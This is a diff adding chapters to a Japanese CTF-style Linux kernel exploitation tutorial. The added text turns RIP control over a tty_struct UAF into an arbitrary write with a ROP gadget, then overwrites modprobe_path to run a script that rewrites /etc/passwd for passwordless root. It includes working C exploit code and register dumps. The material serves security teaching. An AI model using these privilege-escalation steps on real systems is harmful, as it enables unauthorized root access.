@@ -684,4 +684,106 @@ CR2: 00000000004efd68 CR3: 00000000032f2000 CR4: 00000000003006f0
 ちゃんとvtableに入れておいた値にRIPがなっています。
 RIPが取れました。
 
+## AAW
+
+さて、RIPがとれたのであとは色々できます。
+
+今回はSMEP/SMAPが有効なため、userlandのコードを動かしたり、userlandにstack pivotすることはできません
+(厳密に言うと、SMAP/SMEPはCR4レジスタを操作することで無効化出来るためstack pivotくらいならできますが)。
+また、`tty_ioctl`では呼び出し直後に引数として`tty_struct`自身のアドレスが入るため、
+`tty_struct`上にROP chainを構築することもできますが、今回は他の方法を取ることにします。
+
+目的のためには、AAWが出来るようにしたいです。
+`ioctl(tty_fd, 0xabcdefg, 0x1234567)`で`ops->ioctl`を呼び出した直後には、レジスタは以下のようになっています:
+
+```txt
+$rax   : 0xffffffff81049018 <ptep_set_access_flags+0x18>  ->  0x0000441f0fc30a89
+$rbx   : 0xffff8880032f8400  ->  0x0000000000005401 <irq_stack_backing_store+0x3401>
+$rcx   : 0xbcdefg
+$rdx   : 0x1234567
+$rsp   : 0xffffc9000045bdf0  ->  0xffffffff813801b6 <tty_ioctl+0x386>  ->  0xd2850ffffffdfd3d
+$rbp   : 0xffffc9000045bea0  ->  0xffffc9000045bf30  ->  0xffffc9000045bf48  ->  0x0000000000000000 <fixed_percpu_data>
+$rsi   : 0xabcefg
+$rdi   : 0xffff8880032f8400  ->  0x0000000000005401 <irq_stack_backing_store+0x3401>
+$rip   : 0xffffffff81049018 <ptep_set_access_flags+0x18>  ->  0x0000441f0fc30a89
+$r8    : 0x1234567
+$r9    : 0x0
+$r10   : 0xffff888002d368a8  ->  0x00000000000d21b6
+$r11   : 0x0
+$r12   : 0xabcdefg
+$r13   : 0xffff8880032f8400  ->  0x0000000000005401 <irq_stack_backing_store+0x3401>
+$r14   : 0x1234567
+$r15   : 0xffff888003277100  ->  0x0000000000000000 <fixed_percpu_data>
+```
+
+`$rcx`が第2引数(4byte)、`$rdx`が第3引数(8byte)になっていることがわかりますね。
+よって、以下のようなgadgetを使いましょう:
+
+```S
+mov [rdx], ecx
+```
+
+このgadgetを指定することで、第3引数で指定してアドレスに第2引数で指定した任意の4byteを書き込むことができます。
+AAW達成です。
+
 ## modprobe_path
+
+AAWが達成でき、かつkbaseも求められています。
+こんなときは、`modprobe_path`というkernel変数を書き換えてしまうことで簡単にrootが取れます。
+
+`modprobe_path`は、あるプログラムを実行しようとしたときに、対応するハンドラが見つからない場合にデフォルトで呼び出されるプログラムのパスを保持しています。
+「プログラムに対応するハンドラ」というのは、
+Cのプログラムであれば`ld`、
+shebangとして`#!/usr/bin/python`と書かれたスクリプトならば`python`と言った感じです。
+
+`modprobe_path`はデフォルトで`/sbin/modprobe`になっています。
+また、これが呼び出されるときにはroot権限で実行されます。
+よってこの変数を書き換えてしまえば、謎のバイナリを動かす際に任意のプログラムをroot権限で動かすことが可能となります。
+
+{{< alert title="modprobe_pathをもっと知りたいあなたに" color="info" >}}
+ただでさえ本章は長くなってしまっているため、`modprobe_path`の説明は最低限に抑えました。
+もっとその実装やkernelコードを知りたい場合には、[以前筆者が書いた資料](https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md)を参照してみてください。
+{{< /alert >}}
+
+exploitでは、まず以下のように「謎のプログラム」(`/tmp/nirugiri`)と「`modprobe_path`に指定してrootで動かしたいスクリプト」(`/tmp/a`)を作成します:
+
+```c
+system("echo -ne \"\\xff\\xff\\xff\\xff\" > /tmp/nirugiri");
+system(
+    "echo -e \"#!/bin/sh\necho 'root::0:0:root:/root:/bin/sh' > "
+    "/etc/passwd\" > /tmp/a");
+system("chmod +x /tmp/nirugiri");
+system("chmod +x /tmp/a");
+```
+
+`nirugiri`は`0xFF`だけで構成される4byteバイナリであり、
+このようなファイルに対するハンドラは存在しないため`modprobe_path`で指定されるプログラムが実行されることになります。
+また、`modprobe_path`として今回は`/tmp/a`というシェルスクリプトを書きます。
+このスクリプトは、`/etc/passwd`に`root::0:0:root:/root:/bin/sh`という行を追加するものです。
+`/etc/passwd`は3番目のフィールド(1-origin)に`0`を書き込むとパスワードなしという意味になります。
+よって、この行を`/etc/passwd`に書き込むことで`root`ユーザにパスワード無しで`su`することができるようになります。
+
+続いて、先程得たAAWプリミティブを使って`modprobe_path`に`/tmp/a`と書き込みます。
+この際、4byteずつしか書き込めないことに注意してください:
+
+```c
+char *fname = "/tmp/a\x00";
+ioctl(tty_fd, ((uint *)fname)[0], modprobe_path);
+ioctl(tty_fd, ((uint *)fname)[1], modprobe_path + 4);
+```
+
+最後に、「謎のプログラム」を実行すれば`modprobe_path`がrootで実行されます:
+
+```c
+system("/tmp/nirugiri");
+system("/bin/sh -c su");
+```
+
+----------------------------------------
+
+ここまでの手順で、`userfaultfd`を使って安定した競合状態を引き起こし、UAFを発生させる方法の説明が終わりです。
+皆さんも是非リモートでフラグをとってみてください。
+
+なお、exploitを実際に書いてみるといくつか嵌りそうなポイントがあると思います。
+手を動かすことが大事なのでとりあえずGDBでデバッグしてみて、
+少し考えて分からなければDiscordで聞いてください。
